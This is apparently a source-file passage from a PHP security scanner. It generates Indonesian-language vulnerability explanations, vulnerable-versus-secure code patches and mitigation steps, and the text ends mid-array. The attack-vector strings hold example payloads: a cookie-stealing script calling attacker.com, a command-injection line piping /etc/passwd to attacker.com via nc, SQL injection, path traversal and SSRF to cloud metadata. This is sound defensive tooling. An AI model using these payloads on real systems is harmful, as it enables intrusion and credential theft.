            'ssl_cert_chain' => [
                'summary' => 'Rantai sertifikat SSL/TLS tidak lengkap (Chain of Trust Incomplete / Missing Intermediate CA). Web server hanya mengirimkan sertifikat domain tanpa sertifikat perantara (intermediate certificate).',
                'cause' => 'File sertifikat pada konfigurasi web server (Nginx/Apache) hanya mengarah ke berkas cert.pem/domain.crt, bukan berkas fullchain.pem/bundle.crt yang menyertakan Intermediate CA.',
                'attack_vector' => "1. Klien, browser mobile, aplikasi Android/iOS, atau API consumer yang belum menyimpan sertifikat Intermediate CA di trust store lokal akan menolak koneksi HTTPS.\n2. Muncul peringatan 'SSL Handshake Failed', 'SEC_ERROR_UNKNOWN_ISSUER', atau 'Untrusted Connection' yang memblokir akses pengguna sah.",
                'impact' => 'Aplikasi web gagal diakses di perangkat mobile dan sistem pihak ketiga, penurunan reputasi domain, serta kegagalan kepatuhan keamanan TLS.',
                'verification' => 'openssl s_client -connect ' . ($finding->endpoint ?: 'example.com:443') . ' -showcerts',
            ],
            'weak_ssl_ciphers' => [
                'summary' => 'Audit SSL/TLS menemukan penggunaan cipher suite usang, algoritma hashing lemah (e.g. SHA-1/MD5), atau dukungan versi protokol TLS lawas (TLS 1.0 / 1.1).',
                'cause' => 'Konfigurasi SSL pada web server mengizinkan cipher CBC mode atau algoritma enkripsi RC4/3DES demi kompatibilitas klien sangat tua.',
                'attack_vector' => "1. Penyerang merekam lalu lintas jaringan terenkripsi (traffic capture).\n2. Penyerang memanfaatkan kelemahan matematis cipher lama (misal POODLE, BEAST, SWEET32) untuk mendekripsi paket data sesi pengguna.",
                'impact' => 'Dekripsi data transaksi finansial, kebocoran kredensial, serta kegagalan audit kepatuhan PCI-DSS / ISO 27001.',
                'verification' => 'openssl s_client -connect ' . ($finding->endpoint ?: 'example.com:443') . ' -tls1_1',
            ],
            'breach_attack' => [
                'summary' => 'Celah keamanan BREACH (CVE-2013-3587) mengeksploitasi fitur kompresi HTTP (seperti gzip atau deflate) pada protokol HTTPS. Penyerang di posisi man-in-the-middle dapat memantau fluktuasi ukuran respon HTTP terkompresi untuk merekonstruksi dan mencuri rahasia dalam halaman web (seperti token CSRF).',
                'cause' => 'Web server mengaktifkan kompresi HTTP (gzip/deflate) pada respon yang memuat konten rahasia dan input dinamis pengguna.',
                'attack_vector' => "1. Penyerang memicu request berbahaya dari browser korban ke target HTTPS.\n2. Penyerang mengamati perubahan ukuran bytes dari respon gzip terenkripsi.\n3. Melalui metode eliminasi berbasis pola kompresi (adaptive compression oracle), penyerang menebak karakter token rahasia satu per satu.",
                'impact' => 'Pencurian token CSRF, session tokens, atau data rahasia pengguna yang mengakibatkan serangan pemalsuan permintaan antar-situs (CSRF).',
                'verification' => 'curl -s -I -H "Accept-Encoding: gzip" https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "content-encoding"',
            ],
            'cache_control' => [
                'summary' => 'Halaman yang memuat informasi sensitif atau data akun pengguna disimpan di cache browser lokal tanpa proteksi no-store / no-cache.',
                'cause' => 'Aplikasi web atau web server tidak mengirimkan header respon Cache-Control: no-store pada rute terautentikasi.',
                'attack_vector' => "1. Pengguna login dan mengakses data profil/transaksi pada komputer publik (kantor/warnet) lalu logout.\n2. Pengguna berikutnya menekan tombol 'Back' (Kembali) pada browser.\n3. Halaman yang memuat data sensitif pengguna sebelumnya ditampilkan kembali secara utuh dari cache disk browser.",
                'impact' => 'Kebocoran Data Pribadi (PII), nomor identitas, riwayat transaksi finansial, dan token otentikasi.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Cache-Control"',
            ],
            'secret_leak' => [
                'summary' => 'Ditemukan token autentikasi rahasia, API Key, private key, atau password basis data yang tertulis secara langsung (hardcoded) di dalam repositori kode.',
                'cause' => 'Kredensial produksi dimasukkan langsung ke kode sumber tanpa melalui environment variables (.env) atau sistem Secret Vault.',
                'attack_vector' => "1. Penyerang mendapatkan akses baca ke repositori kode (melalui kebocoran git, CI/CD logs, atau akses developer).\n2. Penyerang mengekstrak token rahasia dan menggunakannya langsung untuk mengakses database produksi, cloud API, atau akun layanan eksternal.",
                'impact' => 'Akses penuh ke infrastruktur cloud, kebocoran data massal (data breach), tagihan API membengkak, dan pengambilalihan sistem secara permanen.',
                'verification' => 'git log -S "' . substr($finding->title ?? 'secret', 0, 15) . '" --source --all',
            ],
            'sql_injection' => [
                'summary' => 'Input pengguna digabungkan langsung ke dalam kueri database tanpa proses parameter binding atau sanitasi query ORM yang aman.',
                'cause' => 'Penggunaan konkatenasi string secara langsung pada perintah SQL (seperti raw query DB::raw atau query konkatenasi PHP).',
                'attack_vector' => "1. Penyerang mengirimkan payload SQL pada input field (contoh: ' OR '1'='1' --).\n2. Kueri database termodifikasi sehingga mengabaikan logika autentikasi atau mengeksekusi UNION SELECT untuk menyedot seluruh isi tabel database.",
                'impact' => 'Pencurian seluruh isi database (username, password hash, data pelanggan), manipulasi data saldo/transaksi, dan potensi Remote Code Execution via xp_cmdshell / INTO OUTFILE.',
                'verification' => "sqlmap -u 'https://" . ($finding->endpoint ?: 'example.com') . "?id=1' --batch",
            ],
            'xss' => [
                'summary' => 'Data input pengguna yang tidak disanitasi dirender langsung ke dalam dokumen HTML/DOM tanpa contextual escaping.',
                'cause' => 'Penggunaan method render mentah (seperti v-html di Vue, dangerouslySetInnerHTML di React, atau {!! !!} di Blade) pada input pengguna.',
                'attack_vector' => "1. Penyerang menyisipkan payload seperti <script>fetch('https://attacker.com/steal?c='+document.cookie)</script> pada kolom komentar atau parameter URL.\n2. Saat halaman dibuka oleh pengguna lain (termasuk admin), skrip dieksekusi di browser korban dan mengirimkan session cookie ke penyerang.",
                'impact' => 'Pencurian session cookie/token JWT akun, pembajakan akun administrator, manipulasi tampilan web (defacement), dan phishing interaktif.',
                'verification' => 'Periksa apakah output di-escape menggunakan fungsi bawaan template engine atau DOMPurify.',
            ],
            'sri_missing' => [
                'summary' => 'Tag skrip atau stylesheet memuat aset dari jaringan CDN publik pihak ketiga tanpa menyertakan atribut Subresource Integrity (SRI) hash.',
                'cause' => 'Penggunaan tag <script src="https://cdn..."> tanpa atribut integrity="..." dan crossorigin="anonymous".',
                'attack_vector' => "1. Penyerang menyusupi server CDN penyedia pustaka (supply-chain attack) dan menyisipkan skrip malware ke library yang di-hosting.\n2. Saat pengguna memuat aplikasi Anda, browser mengunduh dan mengeksekusi pustaka yang telah dimodifikasi tanpa verifikasi hash kriptografi.",
                'impact' => 'Eksekusi JavaScript berbahaya di seluruh browser pengunjung dan kegagalan integritas rantai pasok perangkat lunak (supply chain).',
                'verification' => 'curl -s https://' . ($finding->endpoint ?: 'example.com') . ' | grep -E "<script|<link" | grep -v "integrity="',
            ],
            'rce' => [
                'summary' => 'Penggunaan fungsi berbahaya yang dapat mengeksekusi perintah shell sistem operasi secara langsung menggunakan argumen input pengguna.',
                'cause' => 'Aplikasi memanggil fungsi exec(), shell_exec(), system(), atau eval() dengan parameter yang dapat dikontrol oleh pengguna luar.',
                'attack_vector' => "1. Penyerang mengirimkan karakter pemisah perintah shell (seperti ; && | `).\n2. Contoh payload: '127.0.0.1; cat /etc/passwd | nc attacker.com 4444'.\n3. Server mengeksekusi reverse shell dan memberikan akses terminal jarak jauh ke penyerang.",
                'impact' => 'Kompromi server total (Full Root/System Takeover), pemasangan backdoor, lateral movement ke server database internal, dan penghapusan data sistem.',
                'verification' => 'Audit pemanggilan fungsi exec/shell_exec/system pada seluruh kode sumber repositori.',
            ],
            'ssrf' => [
                'summary' => 'Aplikasi web mengambil resource eksternal atau memanggil URL menggunakan parameter yang dapat dikontrol oleh pengguna tanpa validasi whitelist domain atau filter IP lokal/private.',
                'cause' => 'Fungsi HTTP client (seperti cURL, Guzzle, file_get_contents, atau fetch) langsung memanggil URL yang dikirim oleh pengguna luar tanpa validasi IP tujuan.',
                'attack_vector' => "1. Penyerang memasukkan alamat IP internal atau loopback (contoh: http://127.0.0.1:8080/admin atau http://169.254.169.254/latest/meta-data/).\n2. Server web mengeksekusi permintaan tersebut atas nama server dan mengembalikan respon internal rahasia atau kredensial metadata cloud (AWS/GCP/Azure) ke penyerang.",
                'impact' => 'Pencurian metadata cloud tokens, pemindaian port jaringan privat internal, dan pengambilalihan kontrol layanan internal di balik firewall.',
                'verification' => 'curl -I -X POST -d "url=http://127.0.0.1" https://' . ($finding->endpoint ?: 'example.com'),
            ],
            'path_traversal' => [
                'summary' => 'Aplikasi menerima nama file atau path direktori dari input pengguna dan langsung membuka berkas tersebut tanpa validasi batasan direktori dasar (Directory Traversal / LFI).',
                'cause' => 'Penggunaan fungsi manipulasi berkas (file_get_contents, readfile, include, fopen) dengan konkatenasi parameter tanpa fungsi realpath() atau basename().',
                'attack_vector' => "1. Penyerang menyisipkan karakter dot-dot-slash (../../) pada parameter nama file (contoh: ?file=../../../../etc/passwd atau ../../.env).\n2. Sistem membaca dan merender berkas konfigurasi rahasia atau berkas sistem operasi langsung ke respon pengguna.",
                'impact' => 'Kebocoran kredensial database di .env, pembacaan source code rahasia, dan potensi Remote Code Execution jika dikombinasikan dengan log poisoning.',
                'verification' => "Audit pemanggilan fungsi pembacaan berkas pada " . ($finding->file_path ?: 'kode sumber'),
            ],
            'csrf' => [
                'summary' => 'Aplikasi web memproses permintaan pengubahan status sensitif (state-changing request) tanpa memverifikasi token anti-CSRF yang unik per sesi pengguna.',
                'cause' => 'Rute form POST/PUT/DELETE tidak dilindungi oleh middleware CSRF token atau cookie sesi tidak memiliki atribut SameSite.',
                'attack_vector' => "1. Penyerang membuat halaman web jebakan yang memuat formulir tersembunyi yang otomatis mengirimkan request POST ke aplikasi Anda.\n2. Saat korban yang sedang login mengunjungi website penyerang, browser korban otomatis menyertakan session cookie dan mengeksekusi aksi penting (seperti ganti password atau transfer dana) tanpa sepengetahuan korban.",
                'impact' => 'Pengambilalihan akun pengguna, pengubahan email/password, dan transaksi manipulatif tidak sah.',
                'verification' => 'Periksa apakah form menyertakan token @csrf dan header X-CSRF-TOKEN divalidasi.',
            ],
            'vulnerable_dependency' => [
                'summary' => (function () use ($finding) {
                    $package = data_get($finding->evidence_summary, 'package') ?: 'pustaka/dependensi pihak ketiga';
                    $version = data_get($finding->evidence_summary, 'version') ?: '';
                    $aliases = data_get($finding->evidence_summary, 'aliases');
                    $advisory = $finding->cve ?: (is_array($aliases) && !empty($aliases[0]) ? $aliases[0] : ($finding->rule_id ?: 'Advisory'));
                    $filePath = $finding->file_path ?: 'composer.lock';
                    $fileName = basename($filePath);
                    $title = $finding->title ?: 'Kerentanan pada pustaka pihak ketiga';
                    return "Pustaka pihak ketiga **{$package}**" . ($version ? " versi `{$version}`" : "") . " pada berkas `{$fileName}` terdeteksi mengandung celah keamanan publik terdaftar ({$advisory}). Ringkasan kerentanan: {$title}.";
                })(),
                'cause' => (function () use ($finding) {
                    $package = data_get($finding->evidence_summary, 'package') ?: 'paket terkait';
                    $version = data_get($finding->evidence_summary, 'version') ?: '';
                    return "Versi pustaka {$package}" . ($version ? " ({$version})" : "") . " yang terpasang pada proyek memiliki cacat keamanan yang telah dipublikasikan di basis data keamanan (CVE/GHSA/OSV). Versi ini belum diperbarui ke rilis versi patch yang aman.";
                })(),
                'attack_vector' => (function () use ($finding) {
                    $package = data_get($finding->evidence_summary, 'package') ?: 'library';
                    $version = data_get($finding->evidence_summary, 'version') ?: '';
                    $aliases = data_get($finding->evidence_summary, 'aliases');
                    $advisory = $finding->cve ?: (is_array($aliases) && !empty($aliases[0]) ? $aliases[0] : ($finding->rule_id ?: 'Advisory'));
                    $title = $finding->title ?: 'Kerentanan pustaka';
                    return "1. Penyerang mengidentifikasi keberadaan pustaka `{$package}`" . ($version ? " ({$version})" : "") . " melalui manifest proyek publik, header respon, atau fingerprinting error trace.\n"
                        . "2. Penyerang menganalisis detail advisori `{$advisory}` ({$title}) dan memanfaatkan Proof-of-Concept (PoC) publik yang menargetkan fungsi rentan pada pustaka tersebut.\n"
                        . "3. Melalui masukan/input berbahaya ke endpoint aplikasi yang memproses data menggunakan komponen `{$package}`, penyerang memicu eksploitasi (seperti pembajakan eksekusi perintah sistem, bypass otorisasi, kebocoran data, atau crash layanan).";
                })(),
                'impact' => (function () use ($finding) {
                    $package = data_get($finding->evidence_summary, 'package') ?: 'library';
                    return "Bergantung pada titik integrasi paket `{$package}`, penyerang berpotensi mengeksekusi perintah sewenang-wenang (RCE), memicu Denial of Service (DoS), membocorkan data sensitif, atau mengambil alih kendali server.";
                })(),
                'verification' => (function () use ($finding) {
                    $package = data_get($finding->evidence_summary, 'package') ?: '';
                    $filePath = strtolower($finding->file_path ?: 'composer.lock');
                    $isComposer = Str::contains($filePath, ['composer', '.php']) || Str::contains($package, '/');
                    return $isComposer
                        ? "composer update " . ($package ?: 'vendor/package') . " --with-all-dependencies && composer audit"
                        : "npm audit fix || yarn audit";
                })(),
            ],
            default => [
                'summary' => "Pemindai keamanan **" . strtoupper($finding->engine_key ?: 'TAMENG') . "** mendeteksi indikasi celah keamanan pada aturan `{$finding->rule_id}` di `" . ($finding->file_path ?: ($finding->endpoint ?: 'sistem')) . "`" . ($finding->line_start ? " (baris {$finding->line_start})" : "") . ". Temuan: " . ($finding->title ?: 'Potensi kelemahan keamanan teknis') . ".",
                'cause' => 'Implementasi kode sumber atau konfigurasi server pada lokasi ini belum sepenuhnya memenuhi standar pengamanan terbaik ' . ($finding->owasp ?: 'OWASP') . ' / ' . ($finding->cwe ?: 'CWE') . '.',
                'attack_vector' => "1. Penyerang menganalisis permukaan serang pada `" . ($finding->file_path ?: ($finding->endpoint ?: 'endpoint')) . "`.\n2. Penyerang mengirimkan vektor manipulasi atau muatan payload untuk mengeksploitasi karakteristik aturan {$finding->rule_id}.\n3. Keberhasilan serangan dapat menyebabkan bypass kendali logika atau manipulasi parameter sistem.",
                'impact' => 'Penurunan postur keamanan aplikasi dengan tingkat keparahan ' . strtoupper($finding->severity ?: 'medium') . ', berpotensi menyebabkan pelanggaran privasi data, penurunan ketersediaan, atau eskalasi hak akses.',
                'verification' => $finding->file_path ? "Tinjau baris kode pada berkas `{$finding->file_path}` dan jalankan automated security test." : "Jalankan ulang scanner TAMENG setelah perbaikan kode diterapkan.",
            ],
        };
    }

    private function buildCodePatch(Finding $finding, array $category, string $fileExt): array
    {
        $filePath = $finding->file_path ?: ($finding->endpoint ? 'Konfigurasi Web Server' : 'src/SecurityConfig.' . $fileExt);

        return match ($category['type']) {
            'clickjacking' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf (atau .htaccess)',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Web server belum mengirimkan header anti-framing X-Frame-Options",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header X-Frame-Options \"SAMEORIGIN\" always;\nadd_header Content-Security-Policy \"frame-ancestors 'self';\" always;\n\n# ATAU PADA APACHE (.htaccess):\nHeader always set X-Frame-Options \"SAMEORIGIN\"\nHeader always set Content-Security-Policy \"frame-ancestors 'self';\"",
            ],
            'csp_missing' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf (atau Middleware)',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Tidak ada deklarasi kebijakan pemuatan sumber daya eksternal",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'self';\" always;\n\n# ATAU PADA LARAVEL MIDDLEWARE:\n\$response->headers->set('Content-Security-Policy', \"default-src 'self'; script-src 'self';\");",
            ],
            'x_content_type_options' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Browser klien diizinkan menebak MIME-type secara otomatis (MIME-sniffing)",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header X-Content-Type-Options \"nosniff\" always;\n\n# ATAU PADA APACHE (.htaccess):\nHeader always set X-Content-Type-Options \"nosniff\"",
            ],
            'hsts_missing' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/ssl.conf',
                'vulnerable_code' => "# KONDISI RENTAN:\n# HTTPS aktif tetapi koneksi awal via HTTP tidak dipaksa migrasi permanen",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX (Blok Server Port 443 SSL):\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n\n# PASTIKAN JUGA OTOMATIS REDIRECT DARI PORT 80 KE HTTPS:\nserver {\n    listen 80;\n    server_name example.com www.example.com;\n    return 301 https://\$host\$request_uri;\n}",
            ],
            'permissions_policy' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Fitur hardware browser (camera, mic, geolocation) tidak dibatasi",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header Permissions-Policy \"camera=(), microphone=(), geolocation=(), payment=()\" always;",
            ],
            'coep_coop' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/conf.d/security.conf',
                'vulnerable_code' => "# KONDISI RENTAN:\n# Halaman dokumen tidak diisolasi dari resource lintas-domain",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\nadd_header Cross-Origin-Embedder-Policy \"require-corp\" always;\nadd_header Cross-Origin-Opener-Policy \"same-origin\" always;\nadd_header Cross-Origin-Resource-Policy \"same-origin\" always;",
            ],
            'ssl_cert_chain' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/sites-available/default',
                'vulnerable_code' => "# KONDISI RENTAN (Hanya menggunakan cert domain tanpa intermediate CA):\nssl_certificate /etc/ssl/certs/domain.crt;\nssl_certificate_key /etc/ssl/private/domain.key;",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX (Gunakan Fullchain / Gabungan CA Bundle):\n# Gabungkan sertifikat domain dengan intermediate CA:\n# cat domain.crt intermediate.crt > /etc/ssl/certs/fullchain.pem\n\nssl_certificate /etc/ssl/certs/fullchain.pem;\nssl_certificate_key /etc/ssl/private/domain.key;\n\n# JIKA MENGGUNAKAN APACHE (httpd.conf / ssl.conf):\n# SSLCertificateFile /etc/ssl/certs/domain.crt\n# SSLCertificateChainFile /etc/ssl/certs/intermediate.crt\n# SSLCertificateKeyFile /etc/ssl/private/domain.key",
            ],
            'weak_ssl_ciphers' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/nginx.conf',
                'vulnerable_code' => "# KONDISI RENTAN (Protokol dan cipher lawas masih diizinkan):\nssl_protocols TLSv1 TLSv1.1 TLSv1.2;\nssl_ciphers ALL:!aNULL:!eNULL;",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX (Standar Mozilla Modern/Intermediate):\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;\nssl_prefer_server_ciphers on;\nssl_session_cache shared:SSL:10m;\nssl_session_timeout 1d;",
            ],
            'breach_attack' => [
                'language' => 'nginx',
                'file_path' => '/etc/nginx/nginx.conf',
                'vulnerable_code' => "# KONDISI RENTAN (Kompresi gzip aktif pada seluruh respon termasuk token sensitif):\ngzip on;\ngzip_types text/plain text/css application/json application/javascript text/xml application/xml text/javascript;",
                'secure_code' => "# SOLUSI PERBAIKAN PADA NGINX:\n# Opsi 1: Nonaktifkan kompresi gzip pada web server jika memproses data sensitif\ngzip off;\n\n# Opsi 2: Pisahkan rute statis (gunakan gzip) dengan rute sensitif/login/CSRF (tanpa gzip)\nlocation /api/ {\n    gzip off;\n    proxy_pass http://backend;\n}",
            ],
            'cache_control' => [
                'language' => 'php',
                'file_path' => 'app/Http/Middleware/PreventBackHistory.php',
                'vulnerable_code' => "// KONDISI RENTAN:\n// Respon data profil/akun disimpan di cache browser publik",
                'secure_code' => "// SOLUSI PERBAIKAN PADA LARAVEL MIDDLEWARE / HTTP RESPONSE:\n\$response->headers->set('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');\n\$response->headers->set('Pragma', 'no-cache');\n\$response->headers->set('Expires', 'Sat, 01 Jan 2000 00:00:00 GMT');",
            ],
            'secret_leak' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN (Kunci rahasia tertulis langsung di kode sumber):\n\$apiKey = \"ghp_9843hf98hf29h3f928h3982h39f28\";\n\$dbPassword = \"super_secret_production_password\";",
                'secure_code' => "// KODE AMAN (Memanfaatkan Environment Variables & Secret Manager):\n\$apiKey = config('services.github.token') ?: env('GITHUB_API_TOKEN');\n\$dbPassword = env('DB_PASSWORD');\n\n// Pastikan file .env telah terdaftar pada berkas .gitignore!",
            ],
            'sql_injection' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN (Konkatenasi string variabel langsung ke query SQL):\n\$query = DB::select(\"SELECT * FROM users WHERE email = '\" . \$request->input('email') . \"'\");",
                'secure_code' => "// KODE AMAN (Menggunakan Parameter Binding / Eloquent ORM):\n\$user = User::where('email', \$request->input('email'))->first();\n\n// Atau jika menggunakan raw query, gunakan prepared parameter binding:\n\$query = DB::select(\"SELECT * FROM users WHERE email = ?\", [\$request->input('email')]);",
            ],
            'xss' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN:\necho \"<div>Selamat datang, \" . \$_GET['name'] . \"</div>\";\n// Pada Vue/React: <div v-html=\"userInput\"></div>",
                'secure_code' => "// KODE AMAN (HTML Escaping):\necho \"<div>Selamat datang, \" . htmlspecialchars(\$_GET['name'], ENT_QUOTES, 'UTF-8') . \"</div>\";\n// Pada Vue/React: <div>{{ userInput }}</div> atau gunakan DOMPurify.sanitize(userInput)",
            ],
            'sri_missing' => [
                'language' => 'html',
                'file_path' => $filePath,
                'vulnerable_code' => "<!-- KODE RENTAN (Tanpa verifikasi hash kriptografi): -->\n<script src=\"https://code.jquery.com/jquery-3.7.1.min.js\"><" . "/script>",
                'secure_code' => "<!-- KODE AMAN (Dengan Subresource Integrity hash): -->\n<script src=\"https://code.jquery.com/jquery-3.7.1.min.js\"\n        integrity=\"sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=\"\n        crossorigin=\"anonymous\"><" . "/script>",
            ],
            'rce' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN (Input pengguna diteruskan langsung ke shell sistem):\n\$target = \$_GET['ip'];\nexec(\"ping -c 4 \" . \$target, \$output);",
                'secure_code' => "// KODE AMAN (Validasi format ketat dan escapeshellarg):\n\$target = filter_var(\$_GET['ip'], FILTER_VALIDATE_IP);\nif (!\$target) {\n    throw new InvalidArgumentException('Alamat IP tidak valid.');\n}\nexec(escapeshellcmd(\"ping -c 4 \" . escapeshellarg(\$target)), \$output);",
            ],
            'ssrf' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN (Memanggil URL dari input pengguna tanpa validasi):\n\$url = \$_GET['target_url'];\n\$response = file_get_contents(\$url);",
                'secure_code' => "// KODE AMAN (Whitelist domain & blokir IP privat/internal):\n\$url = filter_var(\$_GET['target_url'], FILTER_VALIDATE_URL);\n\$host = parse_url(\$url, PHP_URL_HOST);\n\$allowedHosts = ['api.trusted.com', 'webhook.partner.com'];\n\nif (!in_array(\$host, \$allowedHosts, true) || filter_var(gethostbyname(\$host), FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    throw new Exception('Akses URL tidak diizinkan atau mengarah ke IP privat.');\n}\n\$response = Http::get(\$url);",
            ],
            'path_traversal' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "// KODE RENTAN (Konkatenasi nama berkas langsung):\n\$file = \$_GET['doc'];\ninclude('/var/www/storage/' . \$file);",
                'secure_code' => "// KODE AMAN (Gunakan basename dan validasi realpath):\n\$file = basename(\$_GET['doc']); // Mencegah traversal ../\n\$baseDir = realpath(storage_path('app/documents'));\n\$targetPath = realpath(\$baseDir . DIRECTORY_SEPARATOR . \$file);\n\nif (!\$targetPath || !str_starts_with(\$targetPath, \$baseDir)) {\n    abort(403, 'Akses berkas di luar direktori aman ditolak.');\n}\nreturn response()->file(\$targetPath);",
            ],
            'csrf' => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "<!-- FORM RENTAN (Tanpa Token CSRF): -->\n<form action=\"/user/update-email\" method=\"POST\">\n    <input type=\"email\" name=\"email\" />\n    <button type=\"submit\">Simpan</button>\n</form>",
                'secure_code' => "<!-- FORM AMAN (Menyertakan CSRF Token): -->\n<form action=\"/user/update-email\" method=\"POST\">\n    @csrf\n    <input type=\"email\" name=\"email\" />\n    <button type=\"submit\">Simpan</button>\n</form>\n\n// Pada request AJAX / Fetch API sertakan header:\n// 'X-CSRF-TOKEN': document.querySelector('meta[name=\"csrf-token\"]').getAttribute('content')",
            ],
            'vulnerable_dependency' => (function () use ($finding) {
                $package = data_get($finding->evidence_summary, 'package') ?: 'vendor/package';
                $version = data_get($finding->evidence_summary, 'version') ?: 'versi-rentan';
                $aliases = data_get($finding->evidence_summary, 'aliases');
                $advisory = $finding->cve ?: (is_array($aliases) && !empty($aliases[0]) ? $aliases[0] : ($finding->rule_id ?: 'CVE'));
                $filePath = $finding->file_path ?: 'composer.lock';
                $fileName = basename($filePath);
                $isComposer = Str::contains(strtolower($filePath), ['composer', '.php']) || Str::contains($package, '/');
                $isNpm = Str::contains(strtolower($filePath), ['package.json', 'package-lock', 'yarn', 'pnpm']) || Str::startsWith($package, '@');

                if ($isComposer) {
                    return [
                        'language' => 'bash',
                        'file_path' => "composer.json / {$fileName}",
                        'vulnerable_code' => "# VERSI DEPENDENSI RENTAN ({$advisory}):\n# Paket: {$package}\n# Versi terpasang saat ini: {$version}\n# Lokasi berkas manifest: {$filePath}",
                        'secure_code' => "# SOLUSI 1 (Direkomendasikan): Perbarui paket spesifik ke versi patch yang aman via Composer:\ncomposer update {$package} --with-all-dependencies\n\n# SOLUSI 2: Jika terdaftar langsung di composer.json, perbarui batasan versi minimal yang aman:\n# \"require\": {\n#     \"{$package}\": \"^<versi_patch_terbaru>\"\n# }\n# composer update {$package}\n\n# SOLUSI 3: Verifikasi status audit keamanan setelah pembaruan:\ncomposer audit",
                    ];
                }

                if ($isNpm) {
                    return [
                        'language' => 'bash',
                        'file_path' => "package.json / {$fileName}",
                        'vulnerable_code' => "# VERSI DEPENDENSI RENTAN ({$advisory}):\n# Paket: {$package}\n# Versi terpasang: {$version}\n# Lokasi berkas: {$filePath}",
                        'secure_code' => "# SOLUSI 1: Jalankan perbaikan otomatis via npm audit:\nnpm audit fix\n\n# SOLUSI 2: Perbarui paket secara eksplisit ke versi terbaru yang aman:\nnpm install {$package}@latest\n\n# SOLUSI 3: Verifikasi status dependensi:\nnpm audit",
                    ];
                }

                return [
                    'language' => 'bash',
                    'file_path' => $fileName,
                    'vulnerable_code' => "# VERSI DEPENDENSI RENTAN ({$advisory}):\n# Paket: {$package}\n# Versi: {$version}",
                    'secure_code' => "# SOLUSI PERBAIKAN:\n# Perbarui paket {$package} ke versi rilis yang telah menambal {$advisory}.\n# Jalankan perintah package manager proyek Anda (composer update / npm audit fix).",
                ];
            })(),
            default => [
                'language' => $fileExt,
                'file_path' => $filePath,
                'vulnerable_code' => "# LOKASI TEMUAN: {$filePath}" . ($finding->line_start ? " (Baris {$finding->line_start})" : '') . "\n# Aturan Pemindai: " . ($finding->rule_id ?? 'Security Rule') . "\n# " . ($finding->title ?? 'Tinjau baris kode atau konfigurasi terkait'),
                'secure_code' => "# SOLUSI PERBAIKAN DIREKOMENDASIKAN:\n# 1. Terapkan validasi masukan ketat (positive validation / whitelisting).\n# 2. Batasi hak akses fungsi menurut prinsip Least Privilege.\n# 3. Aktifkan pertahanan berlapis (defense-in-depth) dan enkripsi data.\n# 4. Tinjau panduan resmi OWASP / CIS Benchmarks untuk aturan ini.",
            ],
        };
    }

    private function buildMitigationSteps(Finding $finding, array $category): array
    {
        return match ($category['type']) {
            'clickjacking' => [
                'Tambahkan header `X-Frame-Options: SAMEORIGIN` pada konfigurasi Nginx/Apache atau middleware HTTP.',
                'Jika website perlu disematkan oleh domain mitra tertentu, gunakan direktif CSP `frame-ancestors \'self\' https://trusted-partner.com`.',
                'Uji kembali menggunakan perintah `curl -I <URL>` untuk memastikan header terkirim pada setiap respon HTTP.',
            ],
            'csp_missing' => [
                'Terapkan kebijakan CSP bertahap, mulai dari mode `Content-Security-Policy-Report-Only` untuk memetakan resource yang dimuat.',
                'Hindari penggunaan direktif `\'unsafe-inline\'` dan `\'unsafe-eval\'` guna mencegah eksekusi skrip injeksi.',
                'Aktifkan header `Content-Security-Policy` final pada konfigurasi Nginx atau middleware backend.',
            ],
            'x_content_type_options' => [
                'Tambahkan header `X-Content-Type-Options: nosniff` pada level global web server.',
                'Pastikan web server selalu mengirimkan header `Content-Type` yang tepat untuk setiap berkas statis (misal image/png, application/json).',
            ],
            'hsts_missing' => [
                'Pastikan seluruh sertifikat SSL/TLS valid dan terpasang dengan benar tanpa chain error.',
